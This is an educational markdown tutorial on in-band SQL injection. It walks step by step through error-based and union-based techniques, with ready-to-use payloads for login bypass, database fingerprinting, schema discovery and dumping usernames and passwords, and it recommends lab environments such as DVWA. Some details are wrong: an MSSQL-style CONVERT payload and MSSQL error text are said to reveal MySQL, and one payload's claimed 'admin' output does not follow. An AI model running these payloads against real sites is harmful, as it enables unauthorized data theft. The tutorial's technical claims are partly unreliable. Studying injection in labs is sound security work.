In-Band SQL Injection is the **most common type of SQLi attack**. It occurs when an attacker uses the **same channel** to submit SQL commands and retrieve results.

* **Why it matters:**

  * Attackers can steal sensitive data like usernames, passwords, and emails.
  * They can modify or delete records.
  * They can potentially take control of the web server.

**Visual Flow:**

```
Attacker → injects SQL → Web Application → Database
          ← receives data/results ←
```

---

<img width="1199" height="376" alt="e0" src="https://github.com/user-attachments/assets/43049454-c37d-400c-a2b4-1febb18bfcc8" />


## **1. In-Band SQLi**

**Key idea:**

* The attack uses the same input/output channel.
* Two main subtypes:

  1. **Error-Based SQL Injection**
  2. **Union-Based SQL Injection**

**Example of vulnerable query:**

```sql
SELECT * FROM users WHERE username = '<input_username>' AND password = '<input_password>';
```

* **Attacker input:** `' OR '1'='1`
* **Modified query:**

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
```

* **Effect:** All rows match → bypass login authentication.

**Practical note:** This type of SQLi is “visible” because results or errors appear in the **same webpage**, making exploitation easier than blind SQLi.

---

<img width="1197" height="377" alt="v" src="https://github.com/user-attachments/assets/853fd1ad-5524-492c-a091-e11b10922898" />


## **2. Error-Based SQL Injection**

**Definition:**

* Relies on **triggering database errors** to gain information about the database structure and data.
* Works best when the application **displays database error messages**.

---

### **Step 1: Identify a vulnerable input**

* Look for inputs that go directly into SQL queries without proper validation or sanitization.
  **Examples:**
* URL parameter: `http://example.com/product.php?id=1`
* Login form: `username` or `password` field
* Search box: `Search: <input>`

**Practical test:** Add a single quote `'` at the input.

* URL: `http://example.com/product.php?id=1'`
* **If an error appears:** Input is likely vulnerable.

---

### **Step 2: Trigger database errors**

* Purpose: Force the database to return a message that leaks information.
  **Payloads:**
* `'` → simple syntax error
* `' AND 1=CONVERT(int,(SELECT @@version))--` → forces type conversion error

**Example:**

* Input:

```
http://example.com/product.php?id=1' AND 1=CONVERT(int,(SELECT @@version))--
```

* Error output:

```
Conversion failed when converting the nvarchar value '5.7.41' to data type int
```

* **Information gained:** Database type/version = MySQL 5.7.41

---

### **Step 3: Interpret database errors**

* MySQL errors: `You have an error in your SQL syntax near '...'`
* MSSQL errors: `Incorrect syntax near '...'`
* Oracle errors: `ORA-00933: SQL command not properly ended`

**Note:** Database-specific errors help craft further payloads.

---

### **Step 4: Extract data via errors**

* Use database functions to extract names of databases, tables, and columns.
  **Example:** Retrieve current database name in MySQL:

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--
```

* Output: `mydatabase`

**Tip:** Always check the output carefully; even small clues can reveal database structure.

---

### **Step 5: Retrieve sensitive data**

* Once table/column names are known, craft payloads to extract sensitive information.
  **Example:** Get admin username:

```sql
1' AND (SELECT username FROM users WHERE id=1)--
```

* Output: `admin`

* **Tip:** Error-Based SQLi is faster for reconnaissance before performing union-based attacks.

---

## **3. Union-Based SQL Injection**

**Definition:**

* Union-Based SQLi allows an attacker to **combine results from multiple SELECT statements** using the SQL `UNION` operator.
* Works when the application **displays query results** on the page.

---

### **Step 1: Identify a vulnerable parameter**

* Same as Error-Based SQLi: URL, form input, search box.
* Test:

```
http://example.com/product.php?id=1'
```

* Error message indicates vulnerability.

---

### **Step 2: Determine the number of columns**

* The injected `UNION SELECT` query must have **the same number of columns** as the original query.

**Test payloads:**

```sql
1' UNION SELECT NULL--       # 1 column
1' UNION SELECT NULL,NULL--  # 2 columns
1' UNION SELECT NULL,NULL,NULL--  # 3 columns
```

* When page stops showing errors → number of columns found.
* **Example:** Query returns 3 columns → union payload must also have 3 columns.

---

### **Step 3: Identify displayable columns**

* Replace `NULL` with visible values to see which columns are displayed:

```sql
1' UNION SELECT 'A','B','C'--
```

* Columns visible on the page are where you can extract data.

---

### **Step 4: Extract data from other tables**

* Use `UNION SELECT` to fetch sensitive information.

**Example:** Retrieve usernames and passwords:

```sql
1' UNION SELECT id, username, password FROM users--
```

* Web page now shows usernames (column 2) and passwords (column 3).

---

### **Step 5: Advanced extraction**

* If table/column names are unknown → combine with **Error-Based SQLi** to discover them first.
* If output is not displayed → combine with **Boolean-Based or Time-Based Blind SQLi**.

**Example:** Extract current database name in displayable column:

```sql
1' UNION SELECT 1, (SELECT database()), 3--
```

* Output in column 2: `mydatabase`

---

### **Tips for Union-Based SQLi**

1. Always **match the number of columns**.
2. Identify **which columns are displayed**.
3. Use **Error-Based SQLi first** if table/column names are unknown.
4. Practice in **labs like Mutillidae or DVWA** for safe experimentation.

---

### **4. Extra Practical Tips**

* Always **test one payload at a time**.

* Start with **Error-Based SQLi** to understand database structure.

* Then use **Union-Based SQLi** to extract data efficiently.

* Check for **database-specific syntax and functions**:

  * MySQL: `CONCAT`, `@@version`, `information_schema`
  * MSSQL: `TOP`, `@@version`, `sysobjects`
  * Oracle: `DUAL`, `ROWNUM`, `USER`

* Safe environment recommendation: **Mutillidae**, **DVWA**, **bWAPP**.

